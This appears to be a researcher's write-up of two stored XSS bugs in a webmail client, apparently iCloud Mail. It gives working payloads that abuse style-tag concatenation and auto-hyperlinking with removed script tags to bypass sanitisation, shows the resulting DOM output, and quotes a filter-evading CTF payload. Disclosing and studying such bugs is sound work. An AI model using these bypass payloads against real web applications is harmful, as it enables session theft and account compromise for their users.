## Stored XSS via Style Tag Confusion
when you had two style tags within the email, the contents of the style tags would be concatenated together into one style tag. This meant that if we could get “</sty” into the first tag and “le>” into the second tag, it would be possible to trick the application into thinking our tag was still open when it really wasn’t.

I sent the following payload to test if it would work:
```
<style></sty</style>
<style>le><script>alert(1)</script></style>
```
![](https://secureservercdn.net/198.71.233.197/623.f31.myftpupload.com/wp-content/uploads/2020/08/alert-1.png)<br>
The DOM of the page included the following:<br>
`<style></style><script>alert(1)</script></style>` <br><br><br>
________________________________________________________________________________________________________________________________
## Stored XSS via Hyperlink Confusion
One thing I’ll always check with these sorts of semi-HTML applications is how they handle hyperlinks. It seems intuitive to automatically turn an unmarked URL into a hyperlink, but it can get messy if it isn’t being sanitized properly or is combined with other functionalities. This is a common place to look for XSS due to the reliance on regex, innerHTML, and all of the accepted elements you can add alongside the URL.

The second piece of interesting functionality for this XSS is the total removal of certain tags like “<script>” and “<iframe>”. This one is neat because certain things will rely on characters like space, tabs, and new lines whereas the void left by the removed tag can provide those characters without telling the JavaScript parser. These indifferences allow for attackers to confuse the application and sneak in malicious characters which can invoke XSS.

I played around with both of these functionalities for a while (automatic hyperlinking and the total removal of certain tags) until deciding to combine the two and attempt to see how they behaved together. To my surprise, the following string broke the hyperlinking functionality and confused the DOM:

`https://www.domain.com/abc#<script></script>https://domain.com/abc`

After sending the above by itself within an email, the content was parsed to the following:

`<a href="https://www.domain.com/abc#<a href=" https:="" www.domain.com="" abc="&quot;" rel="noopener noreferrer">https://www.domain.com/abc</a>`

This was very interesting to see initially, but exploiting it would be a bit harder. It is easy to define the attributes within the tag (e.g. src, onmouseover, onclick, etc.) but providing the values would be difficult as we still had to match the URL regex so it wouldn’t escape the automatic hyperlinking functionality. The payload that eventually worked without sending single quotes, double quotes, parenthesis, spaces, or backticks was the following:

`https://www.icloud.com/mail/#<script></script>https://www.icloud.com/onmouseover=location=/javascript:alert%28document.domain%29/.source;//`

The payload produced this in the DOM:

`<a href="https://www.icloud.com/mail#<a href=" https:="" www.icloud.com="" onmouseover="location=/javascript:alert%28document.domain%29/.source;//&quot;">https://www.icloud.com/onmouseover=location=/javascript:alert%28document.domain%29/.source;//</a>`

And gave us this beautiful alert prompt:

![](https://secureservercdn.net/198.71.233.197/623.f31.myftpupload.com/wp-content/uploads/2020/08/2nd_xss.png)

This payload was from a CTF solution by @Blaklis_. I had originally thought it might be an unexploitable XSS, but there seems to always be a solution somewhere for edge case XSS.

`?age=19;location=/javascript:alert%25281%2529/.source; :>`

*My best explanation here is that (1) when loading the initial URL the characters within the “<script></script>” were acceptable within the automatic hyperlinking process and didn’t break it, then (2) the removal of the script tags created a space or some sort of void which reset the automatic hyperlinking functionality without closing the initial hyperlinking functionality, and lastly (3) the second hyperlink added the additional quote that was used to both break out of the href and create the onmouseover event handler.*

___________________________________________________________________________________________________
___________________________________________________________________________________________________
[XSS Polygot](https://github.com/0xsobky/HackVault/wiki/Unleashing-an-Ultimate-XSS-Polyglot)
[XSS to Internal File Read](https://blog.dixitaditya.com/leveraging-xss-to-read-internal-files/)
